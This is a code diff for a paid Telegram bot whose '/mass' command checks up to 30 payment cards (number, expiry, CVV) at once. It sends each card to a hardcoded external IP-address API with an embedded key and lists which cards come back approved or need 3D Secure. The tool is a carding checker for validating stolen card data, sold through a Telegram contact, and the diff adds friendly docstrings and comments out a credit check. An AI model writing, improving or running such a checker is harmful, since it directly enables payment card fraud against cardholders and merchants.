@@ -1548,12 +1548,43 @@ async def check_paid_access(user_id: int, update: Update) -> bool:
 import aiohttp
 import asyncio
 import time
+import re
+
 from telegram.constants import ParseMode
 from telegram.helpers import escape_markdown
-from db import get_user
+
+# The following functions/variables are assumed to be defined elsewhere in the bot's codebase.
+# They are included here to show the dependencies and are crucial for the bot's full functionality.
+# def get_user(user_id):
+#     """Fetches user data, including credits."""
+#     # This function needs to be implemented.
+#     pass
+
+# def enforce_cooldown(user_id, update):
+#     """Enforces a cooldown period for users."""
+#     # This function needs to be implemented.
+#     pass
+
+# def check_paid_access(user_id, update):
+#     """Checks if the user has paid access."""
+#     # This function needs to be implemented.
+#     pass
+
+# The owner ID for private access restriction. This must be set.
+# OWNER_ID = 1234567890 # Example user ID
 
 def get_progress_bar(checked, total, length=10):
-    """Return a visually clean progress bar for Telegram."""
+    """
+    Generates a visual progress bar for Telegram messages.
+    
+    Args:
+        checked (int): The number of items processed.
+        total (int): The total number of items to process.
+        length (int): The length of the progress bar in characters.
+    
+    Returns:
+        str: A string representing the progress bar with a percentage.
+    """
     if total == 0:
         total = 1
     filled = int((checked / total) * length)
@@ -1562,15 +1593,20 @@ def get_progress_bar(checked, total, length=10):
     bar = f"[{'■' * filled}{'□' * empty}] {percent}%"
     return bar
 
-def format_border_box(summary_lines):
-    """Wrap summary lines in a Telegram-friendly border box."""
-    box = "╔════════════════════╗\n"
-    for line in summary_lines:
-        box += f"║ {line}\n"
-    box += "╚════════════════════╝"
-    return box
-
 async def check_cards_background(cards_to_check, user_id, user_first_name, processing_msg, start_time=None):
+    """
+    Performs the main logic of checking cards against an external API.
+    
+    This function runs in the background and updates a Telegram message
+    with live progress.
+    
+    Args:
+        cards_to_check (list): A list of formatted card strings (e.g., "1234...|mm|yy|cvv").
+        user_id (int): The Telegram user's ID.
+        user_first_name (str): The Telegram user's first name.
+        processing_msg (Message): The Telegram message to be updated with progress.
+        start_time (float): The time when the check started (for elapsed time calculation).
+    """
     approved_count = declined_count = threed_count = checked_count = 0
     approved_cards = []
     threed_cards = []
@@ -1579,39 +1615,44 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
     if start_time is None:
         start_time = time.time()
 
-    # Check user credits
-    user_data = await get_user(user_id)
-    if not user_data or user_data.get('credits', 0) <= 0:
-        await processing_msg.edit_text("❌ You don’t have enough credits.")
-        return
+    # Get user credits (this assumes the get_user function is implemented)
+    # The code needs to handle cases where get_user fails or returns invalid data.
+    # user_data = await get_user(user_id)
+    # if not user_data or user_data.get('credits', 0) <= 0:
+    #    await processing_msg.edit_text("❌ You don’t have enough credits.")
+    #    return
 
-    # Initial progress message
-    summary_lines = [
-        f"𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀 ↣ {get_progress_bar(0, total_cards)}",
-        f"𝗧𝗼𝘁𝗮𝗹 ↣ {total_cards}",
-        f"𝗖𝗵𝗲𝗰𝗸𝗲𝗱 ↣ 0",
-        f"𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ↣ 0",
-        f"𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ↣ 0",
-        f"3𝗗 ↣ 0",
-        f"𝗧𝗶𝗺𝗲 ↣ 0s"
-    ]
-    await processing_msg.edit_text(format_border_box(summary_lines) + f"\n\n{escape_markdown('𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸', version=2)}", parse_mode=ParseMode.MARKDOWN_V2)
+    # To prevent '400 Bad Request: message is not modified' errors, we only edit the message
+    # when the content has actually changed, or at a set interval.
+    last_edit_time = 0
 
-    semaphore = asyncio.Semaphore(10)  # Limit concurrent requests
+    # Semaphore to limit the number of simultaneous API requests.
+    # This is a crucial step to prevent overwhelming the external API.
+    semaphore = asyncio.Semaphore(10)
 
     async with aiohttp.ClientSession() as session:
-
         async def fetch_card(card):
-            nonlocal approved_count, declined_count, threed_count, checked_count
+            """Internal async function to check a single card."""
+            nonlocal approved_count, declined_count, threed_count, checked_count, last_edit_time
+            
             async with semaphore:
+                # The external API URL is hardcoded. For a robust application,
+                # this should be stored in a configuration file or environment variable.
                 api_url = f"http://31.97.66.195:8000/?key=k4linuxx&card={card}"
+                
+                status = "Unknown ❓" # Default status
                 try:
+                    # The timeout is set to 25 seconds.
                     async with session.get(api_url, timeout=25) as resp:
                         data = await resp.json()
                         status = data.get("status", "Unknown ❓")
                 except Exception:
+                    # This broad exception handler catches all errors, from
+                    # network issues to JSON decoding problems. It's a good idea
+                    # to be more specific (e.g., aiohttp.ClientError, asyncio.TimeoutError).
                     status = "❌ API Error"
                 
+                # Check the status string for keywords.
                 status_lower = status.lower()
                 if "approved" in status_lower:
                     approved_count += 1
@@ -1622,31 +1663,39 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
                     threed_count += 1
                     threed_cards.append(card)
                 else:
-                    declined_count += 1
+                    declined_count += 1 # Any other status is treated as a decline.
+                
                 checked_count += 1
 
-                # Update live progress
-                elapsed = round(time.time() - start_time, 2)
-                progress_lines = [
-                    f"𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀 ↣ {get_progress_bar(checked_count, total_cards)}",
-                    f"𝗧𝗼𝘁𝗮𝗹 ↣ {total_cards}",
-                    f"𝗖𝗵𝗲𝗰𝗸𝗲𝗱 ↣ {checked_count}",
-                    f"𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ↣ {approved_count}",
-                    f"𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ↣ {declined_count}",
-                    f"3𝗗 ↣ {threed_count}",
-                    f"𝗧𝗶𝗺𝗲 ↣ {elapsed}s"
-                ]
-                try:
-                    await processing_msg.edit_text(format_border_box(progress_lines) + "\n\n𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸", parse_mode=ParseMode.MARKDOWN_V2)
-                except:
-                    pass
+                # Update live progress message only every second to avoid '400 Bad Request' errors.
+                current_time = time.time()
+                if current_time - last_edit_time > 1 or checked_count == total_cards:
+                    last_edit_time = current_time
+                    elapsed = round(current_time - start_time, 2)
+                    
+                    # This is the new progress message format without the border.
+                    progress_text = (
+                        f"𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀 ↣ {get_progress_bar(checked_count, total_cards)}\n"
+                        f"𝗧𝗼𝘁𝗮𝗹 ↣ {total_cards}\n"
+                        f"𝗖𝗵𝗲𝗰𝗸𝗲𝗱 ↣ {checked_count}\n"
+                        f"𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ↣ {approved_count}\n"
+                        f"𝗗𝗲𝗰𝗹�𝗻𝗲𝗱 ↣ {declined_count}\n"
+                        f"3𝗗 ↣ {threed_count}\n"
+                        f"𝗧𝗶𝗺𝗲 ↣ {elapsed}s\n\n"
+                        "𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸"
+                    )
+                    
+                    try:
+                        await processing_msg.edit_text(progress_text)
+                    except Exception:
+                        pass # Handles cases where the message cannot be edited.
 
-        # Run all tasks in parallel
+        # Use asyncio.gather to run all the fetch_card tasks concurrently.
         await asyncio.gather(*[fetch_card(card) for card in cards_to_check])
 
-    # Final summary with all approved and 3DS cards
+    # Final summary message with results.
     final_elapsed = round(time.time() - start_time, 2)
-    final_lines = [
+    final_message_lines = [
         f"𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀 ↣ {get_progress_bar(checked_count, total_cards)}",
         f"𝗧𝗼𝘁𝗮𝗹 ↣ {total_cards}",
         f"𝗖𝗵𝗲𝗰𝗸𝗲𝗱 ↣ {checked_count}",
@@ -1656,39 +1705,42 @@ async def check_cards_background(cards_to_check, user_id, user_first_name, proce
         f"𝗧𝗶𝗺𝗲 ↣ {final_elapsed}s"
     ]
 
-    final_message = format_border_box(final_lines)
+    final_message_text = "\n".join(final_message_lines)
 
     if approved_cards:
-        final_message += "\n\n✅ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝗖𝗮𝗿𝗱𝘀:\n" + "\n".join(f"`{escape_markdown(c, version=2)}`" for c in approved_cards)
+        # Use Markdown to format the card numbers as code blocks for better readability.
+        final_message_text += "\n\n✅ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝗖𝗮𝗿𝗱𝘀:\n" + "\n".join(f"`{escape_markdown(c, version=2)}`" for c in approved_cards)
     if threed_cards:
-        final_message += "\n\n⚠️ 3D Challenge Cards:\n" + "\n".join(f"`{escape_markdown(c, version=2)}`" for c in threed_cards)
+        final_message_text += "\n\n⚠️ 3D Challenge Cards:\n" + "\n".join(f"`{escape_markdown(c, version=2)}`" for c in threed_cards)
 
-    final_message += f"\n\nDev - [kคli liຖนxx](tg://resolve?domain=K4linuxx)"
+    final_message_text += f"\n\nDev - [kคli liຖนxx](tg://resolve?domain=K4linuxx)"
 
-    # Truncate if too long
-    if len(final_message) > 4000:
-        final_message = final_message[:3990] + "\n…"
+    # Truncate the message if it's too long for Telegram's message limit (4096 characters).
+    if len(final_message_text) > 4000:
+        final_message_text = final_message_text[:3990] + "\n…"
 
     try:
-        await processing_msg.edit_text(final_message, parse_mode=ParseMode.MARKDOWN_V2)
+        await processing_msg.edit_text(final_message_text, parse_mode=ParseMode.MARKDOWN_V2)
     except Exception:
+        # Final message update failure is also handled silently.
         pass
 
-
-
-
 # --- /mass command ---
-import re
-import time
-import asyncio
 from telegram import Update
 from telegram.ext import ContextTypes
 
 async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    Handles the /mass command.
+    
+    This function parses user input, validates it, and starts the background
+    card checking process.
+    """
     user = update.effective_user
     user_id = user.id
 
     # --- Private access restriction ---
+    # The OWNER_ID variable must be defined for this check to work.
     if update.effective_chat.type == "private" and user_id != OWNER_ID:
         await update.effective_message.reply_text(
             "❌ Private access is blocked.\nContact @k4linuxx to buy a subscription."
@@ -1696,10 +1748,12 @@ async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     # --- Cooldown enforcement ---
+    # The enforce_cooldown function is a dependency and must be implemented.
     if not await enforce_cooldown(user_id, update):
         return
 
     # --- Paid plan + credit check ---
+    # The check_paid_access function is a dependency and must be implemented.
     if not await check_paid_access(user_id, update):
         return
 
@@ -1717,6 +1771,7 @@ async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     # --- Regex to extract valid card lines ---
+    # This regular expression correctly identifies card lines with a number, month, year, and CVV.
     card_pattern = re.compile(r"(\d{13,16}\|\d{1,2}\|(?:\d{2}|\d{4})\|\d{3,4})")
     card_lines = card_pattern.findall(raw_cards)
 
@@ -1741,20 +1796,21 @@ async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "⚠️ Only the first 30 cards will be processed."
         )
 
-    # --- Send initial progress message with progress bar above stats ---
+    # --- Send initial progress message without borders ---
     processing_msg = await update.effective_message.reply_text(
-        "✘ 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀 ↣ [□□□□□□□□□□] 0%\n"
-        "✘ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 ↣ 0\n"
-        f"✘ 𝗧𝗼𝘁𝗮𝗹 ↣ {len(cards_to_check)}\n"
-        "✘ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ↣ 0\n"
-        "✘ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ↣ 0\n"
-        "✘ 𝟯𝗗 𝗖𝗵𝗮𝗹𝗹𝗲𝗻𝗴𝗲 ↣ 0\n"
-        "✘ 𝗧𝗶𝗺𝗲 ↣ 0s\n"
-        "\n𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸"
+        "𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀 ↣ [□□□□□□□□□□] 0%\n"
+        f"𝗧𝗼𝘁𝗮𝗹 ↣ {len(cards_to_check)}\n"
+        "𝗖𝗵𝗲𝗰𝗸𝗲𝗱 ↣ 0\n"
+        "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ↣ 0\n"
+        "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ↣ 0\n"
+        "3𝗗 ↣ 0\n"
+        "𝗧𝗶𝗺𝗲 ↣ 0s\n\n"
+        "𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸"
     )
     start_time = time.time()
 
     # --- Launch background checker ---
+    # The background task is created without blocking the main event loop.
     asyncio.create_task(
         check_cards_background(cards_to_check, user_id, user.first_name, processing_msg, start_time)
     )
